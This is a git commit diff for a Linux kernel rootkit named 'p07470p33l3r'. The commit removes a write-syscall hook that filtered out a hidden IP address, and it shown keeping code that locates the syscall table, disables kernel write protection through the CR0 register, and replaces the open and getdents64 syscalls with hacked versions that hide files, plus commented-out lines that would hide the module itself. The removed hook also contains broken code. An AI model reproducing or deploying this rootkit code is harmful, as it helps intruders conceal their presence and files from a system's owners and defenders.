356b96f2e8821a9cb69c52ebc803d5d4d833a323
root <root@localhost.localdomain>
2017-03-09 13:09:47 -0700

    I got rid of the write hijack, not needed for new goal

--- p07470p33l3r.c
+++ p07470p33l3r.c
@@ -38,14 +38,12 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 
 /* Variables */
 
-psize *sys_call_table; // Store syscall table location
+psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
-char *hide_ip = "192.168.1.145"; // Name of IP to hide from user
 
 /* Hacked Syscall Pointers */
 
-asmlinkage ssize_t (*orig_write)(int fd, const void *buff, size_t count);
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_open)(const char *, int, mode_t);
 
@@ -72,36 +70,6 @@ psize **find_sys_call_table(void) { // Finds the system call table (duh)
 }
 
 /* Hacked System Calls */
-
-/* Hacked Write Syscall */
-
-asmlinkage ssize_t hacked_write(int fd, const void *buff, size_t count){ // Hacked version of the write syscall
-	char *write_buff = (char*) kmalloc(1024, GFP_KERNEL);
-	copy_from_user(write_buff, buff, 1023);
-
-	if(strstr(write_buff, hide_ip) == NULL){ // If the text doesn't contain our IP at all, run normal write call
-		kfree(write_buff);
-		return orig_write(fd, buff, count);
-	}
-	else{ // Otherwise, we want to remove the line that contains our IP
-		char *newText = (char*) kmalloc(1024, GFP_KERNEL); // Store the result with no IP
-		char *token = strsep(write_buff, "\n"); // Split each line on newline character
-
-		while(token != NULL){ 
-			if(strstr(token, hide_ip) == NULL){
-				strcpy(newText, token);
-				token = strsep(&buff, "\n");
-			}
-		}
-
-		copy_to_user(buff, newText, 1023);
-
-		//printk("Write Text:%s", newText);
-		kfree(token);
-		kfree(write_buff);
-		return orig_write(fd, buff, count);
-	}
-}
 
 /* Hacked Open Syscall */
 
@@ -166,8 +134,8 @@ int rootkit_init(void) { // Start lel rootkit
 	//list_del_init(&__this_module.list); // Remove module from /proc/modules
 	//kobject_del(&THIS_MODULE->mkobj.kobj); // Remove module from /sys/module
 
-	if(sys_call_table = (psize *) find_sys_call_table()){
-		printk("System call table found at: %p\n", sys_call_table); // Ayyy we found it
+	if(system_call_table = (psize *) find_sys_call_table()){
+		printk("System call table found at: %p\n", system_call_table); // Ayyy we found it
 	}
 	else{
 		printk("Failed to find system call table.\n"); // Welp, back to the drawing board
@@ -175,9 +143,8 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table
 
-	orig_write = (void *)xchg(&sys_call_table[__NR_write],hacked_write); // Replace write with hacked open
-	orig_open = (void *)xchg(&sys_call_table[__NR_open],hacked_open); // Replace open with hacked open
-	orig_getdents64 = (void *)xchg(&sys_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
+	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
+	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
@@ -189,9 +156,8 @@ int rootkit_init(void) { // Start lel rootkit
 void rootkit_exit(void) {
 	write_cr0(read_cr0() & (~0x10000)); // Turn on memory write to syscall table
 
-	xchg(&sys_call_table[__NR_write],orig_write); // Replace hacked write with original
-	xchg(&sys_call_table[__NR_open],orig_open); // Replace hacked open with original
-	xchg(&sys_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
+	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
+	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
 	
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
